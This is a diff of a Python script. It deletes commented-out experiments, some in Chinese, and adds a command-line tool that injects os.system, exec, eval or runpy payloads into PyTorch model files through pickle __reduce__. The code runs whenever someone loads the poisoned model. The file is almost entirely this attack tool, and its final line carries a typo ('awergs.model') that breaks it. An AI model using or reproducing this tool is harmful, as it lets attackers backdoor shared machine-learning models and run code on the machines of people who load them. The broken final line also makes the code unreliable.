@@ -1,75 +1,117 @@
-# from fickling.pickle import Pickled
-# import pickle
-#
-# # Create a malicious pickle
-# data = "my friend needs to know this"
-#
-# pickle_bin = pickle.dumps(data)
-#
-# p = Pickled.load(pickle_bin)
-#
-# p.insert_python_exec('print("you\'ve been pwned !")')
-#
-# with open('payload.pkl', 'wb') as f:
-#     p.dump(f)
-#
-# # innocently unpickle and get your friend's data
-# with open('payload.pkl', 'rb') as f:
-#     data = pickle.load(f)
-#     print(data)
-# import torch
-# import pickle
-# import os
-#
-# # Step 1: 定义一个恶意类，用来注入恶意代码
-# class MaliciousModel(torch.nn.Module):
-#     def __init__(self):
-#         super(MaliciousModel, self).__init__()
-#         # 模型的正常定义
-#         self.dummy_param = torch.nn.Parameter(torch.zeros(1))
-#
-#     def forward(self, x):
-#         return x
-#
-#     def __reduce__(self):
-#         # 使用 __reduce__ 来注入恶意代码
-#         # 在反序列化时执行一个命令
-#         return (self.__class__, ())  # 这会返回恶意类并调用构造方法
-#
-#     def malicious_code(self):
-#         # 在模型加载时执行恶意命令
-#         os.system('echo "Malicious code executed!"')
-#
-# # Step 2: 创建恶意模型实例
-# malicious_model = MaliciousModel()
-#
-# # 将模型保存为一个 PyTorch 的二进制文件 (.bin)
-# malicious_model_path = "malicious_model.bin"
-# torch.save(malicious_model.state_dict(), malicious_model_path)
-#
-# # 使用 pickle 模块将恶意代码序列化到文件
-# with open(malicious_model_path, 'rb') as f:
-#     malicious_bin = torch.load(f)  # 在这里注入恶意代码
-#
-#
-#
-# print("Malicious model with injected payload created.")
-#
-# # Step 3: 加载恶意的 pickle 文件，这时恶意代码会被执行
-# with open('malicious_payload.pkl', 'rb') as f:
-#     malicious_model = pickle.load(f)  # 恶意代码会在这里执行
-#
-# # 使用恶意模型
-# try:
-#     print(malicious_model.dummy_param)
-# except Exception as e:
-#     print(f"Error while using model: {e}")
-import torch
 import os
+import argparse
+import pickle
+import struct
+import shutil
+from pathlib import Path
 
+import torch
 
+class PickleInject():
+    """Pickle injection. Pretends to be a "module" to work with torch."""
+    def __init__(self, inj_objs, first=True):
+        self.__name__ = "pickle_inject"
+        self.inj_objs = inj_objs
+        self.first = first
 
-# Step 3: 恶意加载模型，触发恶意代码
-loaded_model = torch.load('pytorch_model.bin')
-print(loaded_model)
+    class _Pickler(pickle._Pickler):
+        """Reimplementation of Pickler with support for injection"""
+        def __init__(self, file, protocol, inj_objs, first=True):
+            super().__init__(file, protocol)
 
+            self.inj_objs = inj_objs
+            self.first = first
+
+        def dump(self, obj):
+            """Pickle data, inject object before or after"""
+            if self.proto >= 2:
+                self.write(pickle.PROTO + struct.pack("<B", self.proto))
+            if self.proto >= 4:
+                self.framer.start_framing()
+
+            # Inject the object(s) before the user-supplied data?
+            if self.first:
+                # Pickle injected objects
+                for inj_obj in self.inj_objs:
+                    self.save(inj_obj)
+
+            # Pickle user-supplied data
+            self.save(obj)
+
+            # Inject the object(s) after the user-supplied data?
+            if not self.first:
+                # Pickle injected objects
+                for inj_obj in self.inj_objs:
+                    self.save(inj_obj)
+
+            self.write(pickle.STOP)
+            self.framer.end_framing()
+
+    def Pickler(self, file, protocol):
+        # Initialise the pickler interface with the injected object
+        return self._Pickler(file, protocol, self.inj_objs)
+
+    class _PickleInject():
+        """Base class for pickling injected commands"""
+        def __init__(self, args, command=None):
+            self.command = command
+            self.args = args
+
+        def __reduce__(self):
+            return self.command, (self.args,)
+
+    class System(_PickleInject):
+        """Create os.system command"""
+        def __init__(self, args):
+            super().__init__(args, command=os.system)
+
+    class Exec(_PickleInject):
+        """Create exec command"""
+        def __init__(self, args):
+            super().__init__(args, command=exec)
+
+    class Eval(_PickleInject):
+        """Create eval command"""
+        def __init__(self, args):
+            super().__init__(args, command=eval)
+
+    class RunPy(_PickleInject):
+        """Create runpy command"""
+        def __init__(self, args):
+            import runpy
+            super().__init__(args, command=runpy._run_code)
+
+        def __reduce__(self):
+            return self.command, (self.args,{})
+
+parser = argparse.ArgumentParser(description="PyTorch Pickle Inject")
+parser.add_argument("model", type=Path)
+parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
+parser.add_argument("args")
+parser.add_argument("-v", "--verbose", help="verbose logging", action="count")
+
+args = parser.parse_args()
+
+command_args = args.args
+
+# If the command arg is a path, read the file contents
+if os.path.isfile(command_args):
+    with open(command_args, "r") as in_file:
+        command_args = in_file.read()
+
+# Construct payload
+if args.command == "system":
+    payload = PickleInject.System(command_args)
+elif args.command == "exec":
+    payload = PickleInject.Exec(command_args)
+elif args.command == "eval":
+    payload = PickleInject.Eval(command_args)
+elif args.command == "runpy":
+    payload = PickleInject.RunPy(command_args)
+
+# Backup the model
+backup_path = "{}.bak".format(args.model)
+shutil.copyfile(args.model, backup_path)
+
+# Save the model with the injected payload
+torch.save(torch.load(args.model), f=awergs.model, pickle_module=PickleInject([payload]))
